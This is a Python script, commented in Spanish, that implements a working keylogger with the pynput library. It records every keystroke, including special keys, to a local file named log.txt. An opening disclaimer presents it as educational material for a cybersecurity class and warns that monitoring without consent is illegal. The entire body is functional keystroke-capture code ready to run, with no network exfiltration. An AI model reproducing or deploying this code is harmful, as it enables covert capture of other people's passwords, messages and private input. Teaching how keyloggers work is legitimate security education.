# ##############################################################################
# # ATENCIÓN: DESCARGO DE RESPONSABILIDAD ÉTICO                             #
# ##############################################################################
# #
# # Este script es una herramienta creada con fines puramente educativos.
# # Su objetivo es demostrar los principios básicos de funcionamiento de un
# # keylogger en un entorno controlado, como una clase de ciberseguridad.
# #
# # El uso de este software para monitorear una computadora sin el
# # consentimiento explícito del propietario y de los usuarios es ILEGAL y
# # NO ÉTICO.
# #
# # El autor no se hace responsable del mal uso de esta herramienta.
# # Utilízalo bajo tu propia responsabilidad y siempre dentro de la legalidad.
# #
# ##############################################################################


# --- IMPORTACIÓN DE LIBRERÍAS ---
# Importamos la clase 'Listener' de la librería 'pynput.keyboard'.
# 'pynput' es un módulo que nos permite controlar y monitorear dispositivos
# de entrada como el teclado y el ratón. 'Listener' es la clase específica
# que "escuchará" las pulsaciones del teclado.
from pynput.keyboard import Key, Listener

# --- CONFIGURACIÓN INICIAL ---
# Definimos el nombre del archivo donde se guardarán las pulsaciones.
# Si el archivo no existe, se creará automáticamente. Si ya existe,
# se añadirán las nuevas pulsaciones al final del mismo.
log_file = "log.txt"


# --- DEFINICIÓN DE LAS FUNCIONES ---

# Esta función se ejecutará CADA VEZ que se presione una tecla.
# El 'Listener' le pasará automáticamente el argumento 'key', que contiene
# la información de la tecla pulsada.
def on_press(key):
    """
    Gestiona el evento de pulsación de una tecla y la escribe en el archivo log.
    """
    # Usamos un bloque 'try...except' para manejar dos tipos de teclas:
    # 1. Teclas de caracteres (letras, números, símbolos).
    # 2. Teclas especiales (Control, Espacio, Enter, etc.).

    # Abrimos el archivo de registro en modo 'append' ('a').
    # El modo 'append' asegura que añadimos contenido al final del archivo
    # sin borrar lo que ya estaba escrito.
    # El uso de 'with open(...) as ...' garantiza que el archivo se cierre
    # correctamente, incluso si ocurren errores.
    with open(log_file, "a") as f:
        try:
            # INTENTAMOS escribir el carácter de la tecla.
            # Las teclas normales como 'a', 'b', '1', '$' tienen un atributo '.char'
            # que contiene su representación como carácter.
            # Por ejemplo, para la tecla 'a', key.char es 'a'.
            f.write(key.char)

        except AttributeError:
            # SI OCURRE UN ERROR (AttributeError), significa que la tecla no tiene
            # el atributo '.char'. Esto sucede con las teclas especiales como
            # Espacio, Enter, Shift, etc.

            # Comprobamos qué tecla especial es para darle un formato legible.
            if key == Key.space:
                # Si la tecla es Espacio, escribimos un espacio en el archivo.
                f.write(' ')
            elif key == Key.enter:
                # Si es Enter, escribimos un salto de línea para organizar el texto.
                f.write('\n')
            else:
                # Para cualquier otra tecla especial (Ctrl, Alt, F1, etc.),
                # escribimos su nombre entre corchetes para identificarla claramente.
                # Por ejemplo: [Key.shift], [Key.ctrl_l], etc.
                f.write(f' [{str(key)}] ')


# Esta función (opcional) podría manejar el evento de soltar una tecla.
# En este script simple no la necesitamos, pero es bueno saber que existe.
# def on_release(key):
#     if key == Key.esc:
#         # Detener el listener si se presiona la tecla Escape.
#         return False


# --- INICIO DEL KEYLOGGER ---

# Para que el keylogger comience a funcionar, creamos una instancia del 'Listener'.
# Le indicamos que la función que debe ejecutar cuando se presione una tecla
# es nuestra función 'on_press'.
# El bloque 'with' se encarga de iniciar y detener el listener de forma segura.
print("Keylogger iniciado. Presiona teclas para registrar...")
print(f"Las pulsaciones se guardarán en el archivo: {log_file}")
print("Cierra la ventana de la terminal para detener el script.")

with Listener(on_press=on_press) as listener:
    # 'listener.join()' pone el script en un bucle infinito de espera.
    # Mantiene el listener activo y "escuchando" en segundo plano.
    # El script permanecerá en esta línea hasta que el listener se detenga.
    listener.join()